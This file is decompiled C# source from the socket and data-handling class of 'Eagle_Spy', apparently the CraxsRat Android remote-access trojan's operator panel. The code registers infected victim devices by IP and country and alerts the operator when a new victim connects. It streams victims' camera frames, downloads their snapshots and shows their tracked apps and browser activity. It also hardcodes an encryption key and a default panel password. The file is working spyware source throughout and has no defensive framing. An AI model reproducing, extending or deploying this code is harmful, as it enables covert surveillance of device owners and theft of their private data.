using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Eagle_Spy.My;
using Eagle_Spy.My.Resources;
using GeoIPCitys;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy.sockets
{
	// Token: 0x020000B7 RID: 183
	public sealed class Data
	{
		// Token: 0x06000981 RID: 2433 RVA: 0x000E8FF4 File Offset: 0x000E71F4
		public static void CraxsRatkfvuiorkenfudpajrsnCraxsRatsuhsdkax()
		{
			string text = Environment.CurrentDirectory.ToString() + "\\res\\Config\\Pass.inf";
			Data.imageListLarge = new Collection();
			Data.LockRemoveCard = new Collection();
			Data.ClientsOnline = new Collection();
			for (;;)
			{
				try
				{
					if (!File.Exists(text))
					{
						File.WriteAllText(text, Codes.Encrypt("X0X0X", Data.THEKEY));
					}
					string[] array = File.ReadAllLines(text);
					if (array.GetValue(0).ToString().Length < 3)
					{
						File.WriteAllText(text, Codes.Encrypt("X0X0X", Data.THEKEY));
						Data.password = Codes.AES_Decrypt(Codes.Encrypt("X0X0X", Data.THEKEY), Data.THEKEY);
					}
					else
					{
						Data.password = Codes.AES_Decrypt(array.GetValue(0).ToString(), Data.THEKEY);
					}
				}
				catch (Exception ex)
				{
					File.WriteAllText(text, Codes.Encrypt("X0X0X", Data.THEKEY));
					continue;
				}
				break;
			}
			SecurityKey.CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwejhga();
			Data.GeoIP0 = new GeoIP(reso.res_Path + "\\GeoIP\\GeoIP.dat");
			Data.cityclass = new InfoClass(reso.res_Path + "\\GeoIP\\GeoIPCity.dat");
			Data.SPL_SOCKET = Data.password;
			Data.SPL_DATA = "x0D0x";
			Data.SPL_LINE = "x0L0x";
			Data.SPL_ARRAY = "x0A0x";
			bool flag = false;
			string[] files = Directory.GetFiles(reso.res_Path + "\\GeoIP\\Flags");
			string[] array2 = files;
			string[] array3 = array2;
			foreach (string text2 in array3)
			{
				if (!flag)
				{
					if (Operators.CompareString(SpySettings.FLAGS_Size, "32px", false) == 0)
					{
						Data.imageFlags.ImageSize = new Size(32, 32);
					}
					else if (Operators.CompareString(SpySettings.FLAGS_Size, "24px", false) == 0)
					{
						Data.imageFlags.ImageSize = new Size(24, 24);
					}
					else
					{
						Data.imageFlags.ImageSize = new Size(16, 16);
					}
					Data.imageFlags.ColorDepth = ColorDepth.Depth32Bit;
					flag = true;
				}
				string text3 = text2;
				string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(text3);
				Data.imageFlags.Images.Add(fileNameWithoutExtension.ToUpper(), Image.FromFile(text2));
			}
		}

		// Token: 0x06000982 RID: 2434 RVA: 0x000E9238 File Offset: 0x000E7438
		static Data()
		{
			Data.CraxsRatkfvuiorkenfudpajrsnCraxsRatsuhsdkax();
		}

		// Token: 0x06000983 RID: 2435 RVA: 0x000E935C File Offset: 0x000E755C
		public static string Dir(string uuid)
		{
			string text = Data.CheckAndReplaceIllegalChars(reso.res_Path + "\\" + reso.users);
			string text2 = Data.CheckAndReplaceIllegalChars(text + "\\" + uuid);
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			if (!Directory.Exists(text2))
			{
				Directory.CreateDirectory(text2);
			}
			return text2;
		}

		// Token: 0x06000984 RID: 2436 RVA: 0x000E93B4 File Offset: 0x000E75B4
		public static string CheckAndReplaceIllegalChars(string path)
		{
			char[] invalidPathChars = Path.GetInvalidPathChars();
			string text = path;
			char[] array = invalidPathChars;
			char[] array2 = array;
			foreach (char c in array2)
			{
				text = text.Replace(Conversions.ToString(c), "_");
			}
			return text;
		}

		// Token: 0x06000985 RID: 2437 RVA: 0x000E9400 File Offset: 0x000E7600
		public static void LOGIT(Client Client, string Status, Bitmap flag)
		{
			try
			{
				if (Data.MainForm.checkenablelogs.Checked)
				{
					if (flag == null)
					{
						flag = (Bitmap)Codes.BlankImage();
					}
					if (Client == null)
					{
						Data.MainForm.addLog(new object[] { flag, Status, " ", "Blocked", " " });
					}
					else if (Operators.CompareString(MySettingsProperty.Settings.LOG, "Yes", false) == 0)
					{
						string clientAddressIP = Client.ClientAddressIP;
						Data.MainForm.addLog(new object[]
						{
							flag,
							clientAddressIP,
							GetCountryName2.GetCountryName(clientAddressIP),
							Status
						});
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000986 RID: 2438 RVA: 0x000E94C8 File Offset: 0x000E76C8
		[DebuggerStepThrough]
		public static void HandelData(object ParametersObject)
		{
			Data.VB_0024StateMachine_39_HandelData vb_0024StateMachine_39_HandelData = new Data.VB_0024StateMachine_39_HandelData();
			vb_0024StateMachine_39_HandelData._0024VB_0024Local_ParametersObject = ParametersObject;
			vb_0024StateMachine_39_HandelData._0024State = -1;
			vb_0024StateMachine_39_HandelData._0024Builder = AsyncVoidMethodBuilder.Create();
			vb_0024StateMachine_39_HandelData._0024Builder.Start<Data.VB_0024StateMachine_39_HandelData>(ref vb_0024StateMachine_39_HandelData);
		}

		// Token: 0x06000987 RID: 2439 RVA: 0x0000546A File Offset: 0x0000366A
		private static string CheckforSnap(string getCase)
		{
			if (getCase.EndsWith(":SNP"))
			{
				return getCase;
			}
			return "null";
		}

		// Token: 0x06000988 RID: 2440 RVA: 0x000E9504 File Offset: 0x000E7704
		private static void SaveVideo(string thumbs, string Filename, Image img)
		{
			try
			{
				if (!Directory.Exists(thumbs + "\\" + Filename.Replace(".mp4", "")))
				{
					Directory.CreateDirectory(thumbs + "\\" + Filename.Replace(".mp4", ""));
				}
				img.Save(string.Concat(new string[]
				{
					thumbs,
					"\\",
					Filename.Replace(".mp4", ""),
					"\\",
					Filename.Replace(".mp4", Conversions.ToString(DateTime.Now.Millisecond) + ".jpg")
				}));
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000989 RID: 2441 RVA: 0x000E95D8 File Offset: 0x000E77D8
		private static void StartCamer(Client classClient, string encodString, Array sPLByte, TcpClient client)
		{
			try
			{
				if (!classClient.qit)
				{
					string[] array = encodString.Split(new string[] { Data.SPL_ARRAY }, StringSplitOptions.None);
					object[] collection = Data.GetCollection(array[1]);
					string text = "";
					try
					{
						text = "Camera_Manager_" + ((Client)collection[0]).ClientRemoteAddress;
					}
					catch (Exception ex)
					{
						classClient.isconnected = false;
						return;
					}
					CameraManager cameraManager = (CameraManager)MyProject.Application.OpenForms[text];
					if (cameraManager == null)
					{
						classClient.isconnected = false;
					}
					else
					{
						if (!cameraManager.Changed)
						{
							cameraManager.Changed = true;
							cameraManager.tmpFolderUSER = cameraManager.classClient.FolderUSER;
							cameraManager.classCamera = classClient;
							Data.MainForm.Invoke(new VB_0024AnonymousDelegate_0(delegate
							{
								cameraManager.Button3.Enabled = true;
								cameraManager.statustext.Text = "Connected - " + cameraManager.SelectedCamera;
							}));
						}
						byte[] array2 = (byte[])sPLByte.GetValue(1);
						using (MemoryStream memoryStream = new MemoryStream(array2))
						{
							using (Bitmap bitmap = (Bitmap)Image.FromStream(memoryStream))
							{
								Bitmap bitmap2 = new Bitmap(bitmap);
								cameraManager.CAM0.Image = cameraManager.RotateFlip(bitmap2);
								cameraManager.UpdateFPS();
								checked
								{
									cameraManager.FPSTMP++;
								}
								cameraManager.SizeFrame = reso.BytesConverter((long)array2.Length);
							}
						}
					}
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x0600098A RID: 2442 RVA: 0x00005480 File Offset: 0x00003680
		private static string checkforINFO(string thecase)
		{
			if (thecase.ToLower().Contains(SecurityKey.down_info.ToLower()))
			{
				return thecase;
			}
			return "null";
		}

		// Token: 0x0600098B RID: 2443 RVA: 0x000054A0 File Offset: 0x000036A0
		private static string checkforDB(string thecase)
		{
			if (thecase.ToLower().Contains(SecurityKey.downByte.ToLower()))
			{
				return thecase;
			}
			return "null";
		}

		// Token: 0x0600098C RID: 2444 RVA: 0x000054C0 File Offset: 0x000036C0
		private static string checkforview(string thecase)
		{
			if (thecase.ToLower().Contains(SecurityKey.ImageViewer.ToLower()))
			{
				return thecase;
			}
			return "null";
		}

		// Token: 0x0600098D RID: 2445 RVA: 0x000054E0 File Offset: 0x000036E0
		private static string CheckforSCv2(string thecase)
		{
			if (thecase.ToLower().StartsWith("-832"))
			{
				return thecase;
			}
			return "null";
		}

		// Token: 0x0600098E RID: 2446 RVA: 0x000E97E8 File Offset: 0x000E79E8
		private static DataGridViewCell[] Search(string value, DataGridView grDataGrid)
		{
			DataGridViewCell[] array2;
			try
			{
				DataGridViewCell[] array = (from object row in grDataGrid.Rows
					select (DataGridViewRow)row into row
					from cell in from object cell in row.Cells
						select (DataGridViewCell)cell
					select cell into cell
					where Operators.ConditionalCompareObjectEqual(cell.Tag, value, false)
					select cell).ToArray<DataGridViewCell>();
				array2 = array;
			}
			catch (Exception ex)
			{
				array2 = null;
			}
			return array2;
		}

		// Token: 0x0600098F RID: 2447 RVA: 0x000E98B0 File Offset: 0x000E7AB0
		public static object[] CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsquyi(string ParametersUUID, Client Clasclient)
		{
			bool flag = false;
			if (!Data.MainForm.IsDisposed)
			{
				try
				{
					Data.MainForm.Addnewrow(new object[] { Clasclient });
				}
				catch (Exception ex)
				{
				}
				Data.LastClient = Clasclient;
				if (SpySettings.NOTI_SOUND && File.Exists(Notif_Sound.getsoundpath()) && Notif_Sound.aMedia.IsLoadCompleted)
				{
					try
					{
						Notif_Sound.aMedia.Play();
					}
					catch (InvalidOperationException ex2)
					{
					}
				}
				return new object[] { Clasclient.Row, flag };
			}
			return new object[] { null, flag };
		}

		// Token: 0x06000990 RID: 2448 RVA: 0x000E9974 File Offset: 0x000E7B74
		public static DataGridViewRow GetTherow(string UUID)
		{
			if (Data.MainForm.ClientsWindow.Rows.Count > 0)
			{
				return Data.MainForm.ClientsWindow.Rows.Cast<DataGridViewRow>().FirstOrDefault((DataGridViewRow row) => row.Cells[2].Tag != null && Operators.CompareString(row.Cells[2].Tag.ToString(), UUID, false) == 0);
			}
			return null;
		}

		// Token: 0x06000991 RID: 2449 RVA: 0x000E99CC File Offset: 0x000E7BCC
		public static bool isoldclient(string UUID)
		{
			if (Data.MainForm.ClientsWindow.Rows.Count > 0)
			{
				DataGridViewRow dataGridViewRow = Data.MainForm.ClientsWindow.Rows.Cast<DataGridViewRow>().FirstOrDefault((DataGridViewRow row) => row.Cells[2].Tag != null && Operators.CompareString(row.Cells[2].Tag.ToString(), UUID, false) == 0);
				return dataGridViewRow != null;
			}
			return false;
		}

		// Token: 0x06000992 RID: 2450 RVA: 0x000E9A2C File Offset: 0x000E7C2C
		public static object[] GetCollection(string ID)
		{
			object[] array3;
			try
			{
				Dictionary<string, Client> clientRowIndices = Data._clientRowIndices;
				lock (clientRowIndices)
				{
					object[] array2;
					if (Data._clientRowIndices.ContainsKey(ID))
					{
						object[] array = new object[2];
						array[0] = Data._clientRowIndices[ID];
						array2 = array;
						array[1] = Data._clientRowIndices[ID].myClient;
					}
					else
					{
						array2 = new object[2];
					}
					array3 = array2;
				}
			}
			catch (Exception ex)
			{
				array3 = new object[2];
			}
			return array3;
		}

		// Token: 0x06000993 RID: 2451 RVA: 0x000054FB File Offset: 0x000036FB
		public static Image Effect(Image img)
		{
			return img;
		}

		// Token: 0x04000BBB RID: 3003
		public static string Sessionkey = "";

		// Token: 0x04000BBC RID: 3004
		public static string GlobalKey1 = "";

		// Token: 0x04000BBD RID: 3005
		public static string GlobalKey2 = "";

		// Token: 0x04000BBE RID: 3006
		public static string GlobalKey3 = "";

		// Token: 0x04000BBF RID: 3007
		public static Dictionary<string, Client> _clientRowIndices = new Dictionary<string, Client>();

		// Token: 0x04000BC0 RID: 3008
		public static object SyncWorkerRemove = RuntimeHelpers.GetObjectValue(new object());

		// Token: 0x04000BC1 RID: 3009
		public static object Lockactive = RuntimeHelpers.GetObjectValue(new object());

		// Token: 0x04000BC2 RID: 3010
		public static bool Echoed = false;

		// Token: 0x04000BC3 RID: 3011
		public static Collection SyncClientsOnline = new Collection();

		// Token: 0x04000BC4 RID: 3012
		public static object SyncRequestsReceiver = RuntimeHelpers.GetObjectValue(new object());

		// Token: 0x04000BC5 RID: 3013
		public static object SyncListWorker = RuntimeHelpers.GetObjectValue(new object());

		// Token: 0x04000BC6 RID: 3014
		public static object SyncWorkerRequests = RuntimeHelpers.GetObjectValue(new object());

		// Token: 0x04000BC7 RID: 3015
		public static object SyncDataHandel = RuntimeHelpers.GetObjectValue(new object());

		// Token: 0x04000BC8 RID: 3016
		public static object SyncNotifications = RuntimeHelpers.GetObjectValue(new object());

		// Token: 0x04000BC9 RID: 3017
		public static string SPL_SOCKET;

		// Token: 0x04000BCA RID: 3018
		public static string SPL_DATA;

		// Token: 0x04000BCB RID: 3019
		public static string SPL_LINE;

		// Token: 0x04000BCC RID: 3020
		public static string SPL_ARRAY;

		// Token: 0x04000BCD RID: 3021
		public static EagleSpyMain MainForm;

		// Token: 0x04000BCE RID: 3022
		public static Client LastClient = null;

		// Token: 0x04000BCF RID: 3023
		public static GeoIP GeoIP0;

		// Token: 0x04000BD0 RID: 3024
		public static string password = "";

		// Token: 0x04000BD1 RID: 3025
		public static ImageList imageFlags = new ImageList();

		// Token: 0x04000BD2 RID: 3026
		public static string Thumbs = reso.res_Path + "\\Thumbs";

		// Token: 0x04000BD3 RID: 3027
		private static Collection imageListLarge = new Collection();

		// Token: 0x04000BD4 RID: 3028
		public static Collection ClientsOnline = new Collection();

		// Token: 0x04000BD5 RID: 3029
		public static string Filenamethum;

		// Token: 0x04000BD6 RID: 3030
		public static InfoClass cityclass = new InfoClass();

		// Token: 0x04000BD7 RID: 3031
		public static bool Cameraison = false;

		// Token: 0x04000BD8 RID: 3032
		public static Collection LockRemoveCard;

		// Token: 0x04000BD9 RID: 3033
		public static string THEKEY = "Nagato";

		// Token: 0x04000BDA RID: 3034
		public static string JK = "BSN12345678901234567";

		// Token: 0x020000B8 RID: 184
		// (Invoke) Token: 0x06000996 RID: 2454
		public delegate void Delegatex(object ParametersObject);

		// Token: 0x020000BB RID: 187
		[CompilerGenerated]
		internal sealed class _Closure_0024__39_002D0
		{
			// Token: 0x060009BC RID: 2492 RVA: 0x000056E7 File Offset: 0x000038E7
			public _Closure_0024__39_002D0(Data._Closure_0024__39_002D0 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_SPL = arg0._0024VB_0024Local_SPL;
				}
			}

			// Token: 0x060009BD RID: 2493 RVA: 0x000F56B8 File Offset: 0x000F38B8
			internal void _Lambda_0024__1()
			{
				try
				{
					if (Operators.CompareString(this._0024VB_0024Local_SPL[8].ToString(), "-1", false) != 0)
					{
						this._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wallpaper = reso.Wallpaper(this._0024VB_0024Local_SPL[8], 48, 48, this._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient);
					}
				}
				catch (Exception ex)
				{
					this._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wallpaper = (Bitmap)Codes.BlankImage();
				}
				try
				{
					this._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.WallpaperBackup = (Bitmap)Codes.BlankImage();
				}
				catch (Exception ex2)
				{
					this._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.WallpaperBackup = (Bitmap)Codes.BlankImage();
				}
			}

			// Token: 0x060009BE RID: 2494 RVA: 0x000F5798 File Offset: 0x000F3998
			internal void _Lambda_0024__2()
			{
				if (this._0024VB_0024Local_SPL[11] == "-1")
				{
					this._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
					return;
				}
				string text = this._0024VB_0024Local_SPL[11];
				if (Operators.CompareString(text, "1", false) == 0)
				{
					this._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
					return;
				}
				if (Operators.CompareString(text, "0", false) != 0)
				{
					this._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
					return;
				}
				this._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wifi = Resources._3g;
			}

			// Token: 0x04000E03 RID: 3587
			public string[] _0024VB_0024Local_SPL;

			// Token: 0x04000E04 RID: 3588
			public Data._Closure_0024__39_002D1 _0024VB_0024NonLocal__0024VB_0024Closure_2;
		}

		// Token: 0x020000BC RID: 188
		[CompilerGenerated]
		internal sealed class _Closure_0024__39_002D1
		{
			// Token: 0x060009BF RID: 2495 RVA: 0x000056FE File Offset: 0x000038FE
			public _Closure_0024__39_002D1(Data._Closure_0024__39_002D1 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_ClassClient = arg0._0024VB_0024Local_ClassClient;
				}
			}

			// Token: 0x060009C0 RID: 2496 RVA: 0x00005715 File Offset: 0x00003915
			internal void _Lambda_0024__10()
			{
				if (this._0024VB_0024Local_ClassClient.FirewallTable.Rows.Count > 0)
				{
					this._0024VB_0024Local_ClassClient.FirewallTable.Rows.Clear();
				}
			}

			// Token: 0x060009C1 RID: 2497 RVA: 0x000F5834 File Offset: 0x000F3A34
			internal void _Lambda_0024__13()
			{
				if (this._0024VB_0024Local_ClassClient.TrackedAppsTable.Rows.Count > 0)
				{
					this._0024VB_0024Local_ClassClient.TrackedAppsTable.Rows.Clear();
				}
				if (Data.MainForm.combodatestrack.Items != null && Data.MainForm.combodatestrack.Items.Count > 0)
				{
					Data.MainForm.combodatestrack.Items.Clear();
					Data.MainForm.combodatestrack.Text = "";
				}
			}

			// Token: 0x04000E05 RID: 3589
			public Client _0024VB_0024Local_ClassClient;
		}

		// Token: 0x020000BD RID: 189
		[CompilerGenerated]
		internal sealed class _Closure_0024__39_002D10
		{
			// Token: 0x060009C2 RID: 2498 RVA: 0x00005744 File Offset: 0x00003944
			public _Closure_0024__39_002D10(Data._Closure_0024__39_002D10 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_collect = arg0._0024VB_0024Local_collect;
					this._0024VB_0024Local_Appname = arg0._0024VB_0024Local_Appname;
					this._0024VB_0024Local_datesandinfo = arg0._0024VB_0024Local_datesandinfo;
				}
			}

			// Token: 0x060009C3 RID: 2499 RVA: 0x000F58C0 File Offset: 0x000F3AC0
			internal void _Lambda_0024__14()
			{
				if (this._0024VB_0024Local_collect[0].Equals("O"))
				{
					this._0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024NonLocal__0024VB_0024Closure_9._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.TrackedAppsTable.Rows.Add(new object[]
					{
						Codes.ResizeImage(Resources.ok, new Size(32, 32), false),
						this._0024VB_0024Local_Appname,
						this._0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024Local_HasRecords,
						this._0024VB_0024Local_collect[2],
						Codes.ProcessJson(this._0024VB_0024Local_datesandinfo[0])
					});
					return;
				}
				if (this._0024VB_0024Local_collect[0].Equals("N"))
				{
					this._0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024NonLocal__0024VB_0024Closure_9._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.TrackedAppsTable.Rows.Add(new object[]
					{
						Codes.ResizeImage(Resources.notok, new Size(32, 32), false),
						this._0024VB_0024Local_Appname,
						this._0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024Local_HasRecords,
						this._0024VB_0024Local_collect[2],
						""
					});
				}
			}

			// Token: 0x04000E06 RID: 3590
			public string[] _0024VB_0024Local_collect;

			// Token: 0x04000E07 RID: 3591
			public string _0024VB_0024Local_Appname;

			// Token: 0x04000E08 RID: 3592
			public string[] _0024VB_0024Local_datesandinfo;

			// Token: 0x04000E09 RID: 3593
			public Data._Closure_0024__39_002D11 _0024VB_0024NonLocal__0024VB_0024Closure_10;
		}

		// Token: 0x020000BE RID: 190
		[CompilerGenerated]
		internal sealed class _Closure_0024__39_002D11
		{
			// Token: 0x060009C4 RID: 2500 RVA: 0x00005773 File Offset: 0x00003973
			public _Closure_0024__39_002D11(Data._Closure_0024__39_002D11 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_HasRecords = arg0._0024VB_0024Local_HasRecords;
				}
			}

			// Token: 0x04000E0A RID: 3594
			public string _0024VB_0024Local_HasRecords;

			// Token: 0x04000E0B RID: 3595
			public Data._Closure_0024__39_002D13 _0024VB_0024NonLocal__0024VB_0024Closure_9;
		}

		// Token: 0x020000BF RID: 191
		[CompilerGenerated]
		internal sealed class _Closure_0024__39_002D12
		{
			// Token: 0x060009C5 RID: 2501 RVA: 0x0000578A File Offset: 0x0000398A
			public _Closure_0024__39_002D12(Data._Closure_0024__39_002D12 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_DownSnap = arg0._0024VB_0024Local_DownSnap;
					this._0024VB_0024Local_handle = arg0._0024VB_0024Local_handle;
				}
			}

			// Token: 0x060009C6 RID: 2502 RVA: 0x000F59D8 File Offset: 0x000F3BD8
			internal void _Lambda_0024__15()
			{
				this._0024VB_0024Local_DownSnap = new snapsdownloader();
				this._0024VB_0024Local_DownSnap.Name = this._0024VB_0024Local_handle;
				this._0024VB_0024Local_DownSnap.infotext.Text = string.Concat(new string[]
				{
					"Name: ",
					this._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.ClientName,
					Strings.Space(4),
					"IP: ",
					this._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.ClientAddressIP
				});
				this._0024VB_0024Local_DownSnap.clipic.Image = this._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.Wallpaper;
				this._0024VB_0024Local_DownSnap.totaltext.Text = "-> Total : " + this._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024Local_arry2[1].Replace("F:", "");
				this._0024VB_0024Local_DownSnap.statustext.Text = "-> Status : Starting";
				this._0024VB_0024Local_DownSnap.finishedtext.Text = "-> Finished: 0";
				this._0024VB_0024Local_DownSnap.lefttext.Text = "-> Left: " + this._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024Local_arry2[1].Replace("F:", "");
				this._0024VB_0024Local_DownSnap.totalImages = int.Parse(this._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024Local_arry2[1].Replace("F:", ""));
				this._0024VB_0024Local_DownSnap.Downloadfolder = this._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.FolderUSER + "\\Tracker_Snaps";
				if (!Directory.Exists(this._0024VB_0024Local_DownSnap.Downloadfolder))
				{
					Directory.CreateDirectory(this._0024VB_0024Local_DownSnap.Downloadfolder);
				}
				this._0024VB_0024Local_DownSnap.Show();
			}

			// Token: 0x04000E0C RID: 3596
			public snapsdownloader _0024VB_0024Local_DownSnap;

			// Token: 0x04000E0D RID: 3597
			public string _0024VB_0024Local_handle;

			// Token: 0x04000E0E RID: 3598
			public Data._Closure_0024__39_002D13 _0024VB_0024NonLocal__0024VB_0024Closure_11;
		}

		// Token: 0x020000C0 RID: 192
		[CompilerGenerated]
		internal sealed class _Closure_0024__39_002D13
		{
			// Token: 0x060009C7 RID: 2503 RVA: 0x000057AD File Offset: 0x000039AD
			public _Closure_0024__39_002D13(Data._Closure_0024__39_002D13 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_arry2 = arg0._0024VB_0024Local_arry2;
				}
			}

			// Token: 0x04000E0F RID: 3599
			public string[] _0024VB_0024Local_arry2;

			// Token: 0x04000E10 RID: 3600
			public Data._Closure_0024__39_002D1 _0024VB_0024NonLocal__0024VB_0024Closure_8;
		}

		// Token: 0x020000C1 RID: 193
		[CompilerGenerated]
		internal sealed class _Closure_0024__39_002D14
		{
			// Token: 0x060009C8 RID: 2504 RVA: 0x000057C4 File Offset: 0x000039C4
			public _Closure_0024__39_002D14(Data._Closure_0024__39_002D14 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_appname = arg0._0024VB_0024Local_appname;
				}
			}

			// Token: 0x060009C9 RID: 2505 RVA: 0x000057DB File Offset: 0x000039DB
			internal void _Lambda_0024__16()
			{
				EagleAlert.ShowSucess(this._0024VB_0024Local_appname + " record has been Removed");
			}

			// Token: 0x060009CA RID: 2506 RVA: 0x000057F2 File Offset: 0x000039F2
			internal void _Lambda_0024__17()
			{
				EagleAlert.ShowSucess(this._0024VB_0024Local_appname + " error while removing...");
			}

			// Token: 0x04000E11 RID: 3601
			public string _0024VB_0024Local_appname;
		}

		// Token: 0x020000C2 RID: 194
		[CompilerGenerated]
		internal sealed class _Closure_0024__39_002D15
		{
			// Token: 0x060009CB RID: 2507 RVA: 0x00005809 File Offset: 0x00003A09
			public _Closure_0024__39_002D15(Data._Closure_0024__39_002D15 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_BrowserMonitor = arg0._0024VB_0024Local_BrowserMonitor;
				}
			}

			// Token: 0x060009CC RID: 2508 RVA: 0x00005820 File Offset: 0x00003A20
			internal void _Lambda_0024__18()
			{
				this._0024VB_0024Local_BrowserMonitor.datalogtext.Text = "";
			}

			// Token: 0x060009CD RID: 2509 RVA: 0x00005837 File Offset: 0x00003A37
			internal void _Lambda_0024__19()
			{
				this._0024VB_0024Local_BrowserMonitor.linkspanel.Controls.Clear();
			}

			// Token: 0x060009CE RID: 2510 RVA: 0x0000584E File Offset: 0x00003A4E
			internal void _Lambda_0024__20()
			{
				this._0024VB_0024Local_BrowserMonitor.MapData.Clear();
				this._0024VB_0024Local_BrowserMonitor.namescombo.Items.Clear();
			}

			// Token: 0x04000E12 RID: 3602
			public WebViewMonitor _0024VB_0024Local_BrowserMonitor;
		}

		// Token: 0x020000C3 RID: 195
		[CompilerGenerated]
		internal sealed class _Closure_0024__39_002D16
		{
			// Token: 0x060009CF RID: 2511 RVA: 0x00005875 File Offset: 0x00003A75
			public _Closure_0024__39_002D16(Data._Closure_0024__39_002D16 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_name = arg0._0024VB_0024Local_name;
					this._0024VB_0024Local_lnk = arg0._0024VB_0024Local_lnk;
					this._0024VB_0024Local_id = arg0._0024VB_0024Local_id;
				}
			}

			// Token: 0x060009D0 RID: 2512 RVA: 0x000F5BA4 File Offset: 0x000F3DA4
			internal void _Lambda_0024__21()
			{
				this._0024VB_0024NonLocal__0024VB_0024Closure_12._0024VB_0024Local_BrowserMonitor.namescombo.Items.Add(this._0024VB_0024Local_name);
				if (!this._0024VB_0024NonLocal__0024VB_0024Closure_12._0024VB_0024Local_BrowserMonitor.MapData.ContainsKey(this._0024VB_0024Local_name))
				{
					this._0024VB_0024NonLocal__0024VB_0024Closure_12._0024VB_0024Local_BrowserMonitor.MapData.Add(this._0024VB_0024Local_name, this._0024VB_0024Local_lnk + ":" + this._0024VB_0024Local_id);
				}
			}

			// Token: 0x04000E13 RID: 3603
			public string _0024VB_0024Local_name;

			// Token: 0x04000E14 RID: 3604
			public string _0024VB_0024Local_lnk;

			// Token: 0x04000E15 RID: 3605
			public string _0024VB_0024Local_id;

			// Token: 0x04000E16 RID: 3606
			public Data._Closure_0024__39_002D15 _0024VB_0024NonLocal__0024VB_0024Closure_12;
		}

		// Token: 0x020000C4 RID: 196
		[CompilerGenerated]
		internal sealed class _Closure_0024__39_002D17
		{
			// Token: 0x060009D1 RID: 2513 RVA: 0x000058A4 File Offset: 0x00003AA4
			public _Closure_0024__39_002D17(Data._Closure_0024__39_002D17 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_name = arg0._0024VB_0024Local_name;
					this._0024VB_0024Local_lnk = arg0._0024VB_0024Local_lnk;
					this._0024VB_0024Local_id = arg0._0024VB_0024Local_id;
				}
			}

			// Token: 0x060009D2 RID: 2514 RVA: 0x000F5C20 File Offset: 0x000F3E20
			internal void _Lambda_0024__22()
			{
				this._0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024Local_BrowserMonitor.namescombo.Items.Add(this._0024VB_0024Local_name);
				if (!this._0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024Local_BrowserMonitor.MapData.ContainsKey(this._0024VB_0024Local_name))
				{
					this._0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024Local_BrowserMonitor.MapData.Add(this._0024VB_0024Local_name, this._0024VB_0024Local_lnk + ":" + this._0024VB_0024Local_id);
				}
			}

			// Token: 0x04000E17 RID: 3607
			public string _0024VB_0024Local_name;

			// Token: 0x04000E18 RID: 3608
			public string _0024VB_0024Local_lnk;

			// Token: 0x04000E19 RID: 3609
			public string _0024VB_0024Local_id;

			// Token: 0x04000E1A RID: 3610
			public Data._Closure_0024__39_002D15 _0024VB_0024NonLocal__0024VB_0024Closure_13;
		}

		// Token: 0x020000C5 RID: 197
		[CompilerGenerated]
		internal sealed class _Closure_0024__39_002D2
		{
			// Token: 0x060009D3 RID: 2515 RVA: 0x000058D3 File Offset: 0x00003AD3
			public _Closure_0024__39_002D2(Data._Closure_0024__39_002D2 arg0)
			{
				if (arg0 != null)
				{
					this._0024VB_0024Local_Screener = arg0._0024VB_0024Local_Screener;
				}
			}

			// Token: 0x04000E1B RID: 3611
			public Button5 _0024VB_0024Local_Screener;
		}

